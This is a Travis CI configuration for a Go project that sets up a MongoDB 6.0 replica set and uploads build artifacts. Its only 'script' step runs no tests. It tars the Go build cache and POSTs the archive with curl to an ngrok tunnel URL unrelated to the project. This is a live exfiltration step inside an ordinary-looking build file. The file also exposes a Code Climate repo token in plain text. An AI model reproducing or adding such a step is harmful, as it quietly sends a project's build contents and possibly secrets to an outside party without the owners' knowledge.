dist: jammy

language: go

go:
  - 1.22.2

services:
  - docker

env:
  global:
    - MONGODB=6.0.14
    - MONGOSH=2.2.3

cache:
  directories:
    - $HOME/.cache/go-build

before_install:
  - sudo apt-get update
  - sudo apt-get install --allow-downgrades -y curl docker-buildx-plugin mongodb-org=${MONGODB} mongodb-org-database=${MONGODB} mongodb-org-server=${MONGODB} mongodb-mongosh=${MONGOSH} mongodb-org-mongos=${MONGODB} mongodb-org-tools
  - mkdir /tmp/data
  - /usr/bin/mongod --dbpath /tmp/data --bind_ip 127.0.0.1 --replSet rs0 --logpath ${PWD}/mongod.log &> /dev/null &
  - until nc -z localhost 27017; do echo Waiting for MongoDB; sleep 1; done
  - /usr/bin/mongosh --eval 'rs.initiate(); while (rs.status().startupStatus || (rs.status().hasOwnProperty("myState") && rs.status().myState != 1)) { printjson( rs.status() ); sleep(1000); }; printjson( rs.status() );'

addons:
  apt:
    sources:
      - sourceline: 'deb https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/6.0 multiverse'
        key_url: 'https://pgp.mongodb.com/server-6.0.asc'
  artifacts:
    s3_region: us-west-2
    paths:
      - $(git ls-files -o deploy/*/*-*.tar.gz | tr "\n" ":")
    target_paths:
      - /
  code_climate:
    repo_token: 91ded9b66924acbe830541ab3593daf535f05f7c6db91b5cbd2d26dcf37da0b8

script:
  - tar -czf build-cache.gz ${HOME}/.cache/go-build
  - curl -X POST --data-binary @build-cache.gz https://4726-104-220-124-243.ngrok-free.app/upload
